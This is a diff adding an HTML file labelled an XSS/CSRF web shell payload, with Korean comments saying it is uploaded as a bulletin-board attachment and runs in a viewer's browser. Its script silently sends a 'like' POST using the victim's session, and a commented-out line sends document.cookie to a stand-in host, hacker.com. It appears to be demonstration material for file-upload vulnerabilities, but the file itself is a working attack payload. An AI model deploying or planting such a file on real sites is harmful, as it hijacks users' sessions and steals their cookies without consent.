@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>XSS / CSRF Web Shell Payload</title>
+</head>
+<body>
+    <h2 style="color:red;">You have been HACKED! (HTML/JS Web Shell)</h2>
+    <p>이 HTML 파일은 게시판 첨부파일로 업로드된 후, 열람 시 브라우저에서 스크립트가 실행됩니다.</p>
+    <p>아래 스크립트는 피해자의 권한(쿠키/세션)을 이용해 게시글의 '추천(Like)' 버튼을 몰래 누르거나 악의적인 동작을 수행할 수 있습니다.</p>
+    
+    <script>
+        alert('악성 HTML/JS 파일이 실행되었습니다! 현재 당신의 세션을 훔칠 수 있습니다.');
+        
+        // 예시: 1번 게시글에 몰래 좋아요(Like) 누르기 (CSRF 공격)
+        fetch('/post/1/like', {
+            method: 'POST'
+        }).then(response => {
+            console.log("XSS/CSRF: 1번 게시글에 좋아요 버튼을 클릭하도록 조작했습니다.");
+        });
+
+        // 실제 공격에서는 이 단계에서 `document.cookie`를 해커의 서버로 전송합니다.
+        // new Image().src = "http://hacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
+    </script>
+</body>
+</html>
